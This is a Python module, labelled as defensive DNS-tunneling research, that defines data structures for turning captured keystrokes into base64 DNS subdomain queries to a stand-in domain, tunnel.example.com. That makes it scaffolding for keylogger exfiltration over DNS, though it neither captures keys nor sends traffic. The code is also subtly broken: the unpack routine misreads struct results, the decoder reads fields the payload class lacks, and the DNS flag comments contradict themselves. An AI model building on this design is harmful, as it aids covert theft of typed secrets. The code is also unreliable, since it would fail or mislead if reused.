"""DNS Tunneling Data Model Definitions.

This module provides typed data structures for DNS tunneling research,
modeling keystroke capture events and exfiltration payloads.

ATT&CK: T1048.003 (Exfiltration Over Alternative Protocol)
Use Case: Defensive analysis of DNS-based C2 communication patterns.
"""

import base64
import struct
from dataclasses import dataclass, field
from typing import Optional


@dataclass(frozen=True)
class KeystrokeEvent:
    """Represents a single captured keystroke event with metadata.

    Attributes:
        timestamp_ms: Millisecond-precision timestamp of the keypress.
        key_code: Integer key code (e.g., 65 for 'A', 13 for Enter).
        modifiers: Bitmask of modifier keys (Ctrl=1, Alt=2, Shift=4, Win=8).
        ascii_char: Optional printable ASCII character if applicable.
        raw_bytes: Raw byte representation of the key event.
    """

    timestamp_ms: int = field(default=0)
    key_code: int = field(default=0)
    modifiers: int = field(default=0)
    ascii_char: Optional[str] = field(default=None)
    raw_bytes: bytes = field(default=b"")


@dataclass(frozen=True)
class ExfilChunk:
    """Wraps keystroke data with base64 encoding for DNS exfiltration.

    The chunk is encoded as a single subdomain label in the DNS query,
    allowing multiple keystrokes to be exfiltrated per query via padding.

    Attributes:
        payload_id: Unique identifier for this chunk (session + sequence).
        timestamp_ms: Timestamp of the captured event.
        key_code: Integer key code.
        modifiers: Bitmask of modifier keys.
        ascii_char: Printable ASCII character if applicable.
        raw_bytes: Raw byte representation of the key event.
    """

    payload_id: int = field(default=0)
    timestamp_ms: int = field(default=0)
    key_code: int = field(default=0)
    modifiers: int = field(default=0)
    ascii_char: Optional[str] = field(default=None)
    raw_bytes: bytes = field(default=b"")

    def encode(self, max_length: int = 63) -> str:
        """Encode the chunk as a base64 string truncated to DNS label length.

        Args:
            max_length: Maximum subdomain label length (default 63 per RFC 1035).

        Returns:
            Base64-encoded string suitable for use as a DNS subdomain label.
        """
        encoded = base64.urlsafe_b64encode(self.raw_bytes).decode("ascii")
        return encoded[:max_length]


@dataclass(frozen=True)
class DNSPayload:
    """Structures the complete DNS query payload for tunneling exfiltration.

    Combines a subdomain (encoded keystroke data), TTL, and flags into
    a single DNS record structure suitable for binary packing.

    Attributes:
        domain: Base domain name (e.g., "tunnel.example.com").
        subdomain: Base64-encoded keystroke chunk as the query label.
        ttl_seconds: Time-to-live value for the DNS record.
        flags: Bitmask of DNS flags (QR=0x80, AA=0x02, TC=0x04, RD=0x01).
    """

    domain: str = field(default="tunnel.example.com")
    subdomain: str = field(default="")
    ttl_seconds: int = field(default=300)
    flags: int = field(default=0x81)  # QR + RD (query, recursion desired)

    def pack(self) -> bytes:
        """Pack the DNS payload into binary format using struct module.

        Format: subdomain (varlen) | domain (varlen) | TTL (I) | flags (H)

        Returns:
            Packed binary representation of the DNS query payload.
        """
        # Pack subdomain length + subdomain + domain length + domain + TTL + flags
        subdomain_len = len(self.subdomain).to_bytes(2, "big")
        domain_len = len(self.domain).to_bytes(2, "big")

        return (
            subdomain_len
            + self.subdomain.encode("ascii")
            + domain_len
            + self.domain.encode("ascii")
            + struct.pack(">I", self.ttl_seconds)
            + struct.pack(">H", self.flags)
        )

    @classmethod
    def unpack(cls, data: bytes) -> "DNSPayload":
        """Unpack binary DNS payload back into a DNSPayload instance.

        Args:
            data: Binary-packed DNS query payload.

        Returns:
            A new DNSPayload instance with decoded fields.
        """
        offset = 0
        subdomain_len, offset = struct.unpack_from(">H", data, offset)
        subdomain = data[offset : offset + subdomain_len].decode("ascii")
        offset += subdomain_len

        domain_len, offset = struct.unpack_from(">H", data, offset)
        domain = data[offset : offset + domain_len].decode("ascii")
        offset += domain_len

        ttl_seconds, flags = struct.unpack_from(">IH", data, offset)

        return cls(
            subdomain=subdomain,
            domain=domain,
            ttl_seconds=ttl_seconds,
            flags=flags,
        )


# Convenience factory functions for defensive analysis tooling

def create_dns_query(payload_id: int, keystroke: KeystrokeEvent) -> DNSPayload:
    """Factory function to build a DNSPayload from a KeystrokeEvent.

    Args:
        payload_id: Unique session identifier.
        keystroke: The captured keystroke event.

    Returns:
        A DNSPayload ready for binary packing and transmission.
    """
    chunk = ExfilChunk(payload_id=payload_id, **keystroke.__dict__)
    return DNSPayload(
        domain="tunnel.example.com",
        subdomain=chunk.encode(max_length=63),
        ttl_seconds=300,
        flags=0x81,
    )


def decode_dns_payload(data: bytes) -> tuple[DNSPayload, Optional[KeystrokeEvent]]:
    """Decode a DNS query payload and extract the keystroke event.

    Args:
        data: Binary-packed DNS query payload.

    Returns:
        Tuple of (DNSPayload, KeystrokeEvent or None if no subdomain).
    """
    payload = DNSPayload.unpack(data)
    if not payload.subdomain:
        return payload, None

    try:
        raw_bytes = base64.urlsafe_b64decode(payload.subdomain.encode("ascii"))
        event = KeystrokeEvent(
            timestamp_ms=payload.timestamp_ms,
            key_code=payload.key_code,
            modifiers=payload.modifiers,
            ascii_char=payload.ascii_char,
            raw_bytes=raw_bytes,
        )
    except Exception:
        return payload, None

    return payload, event


__all__ = ["DNSPayload", "KeystrokeEvent", "ExfilChunk"]
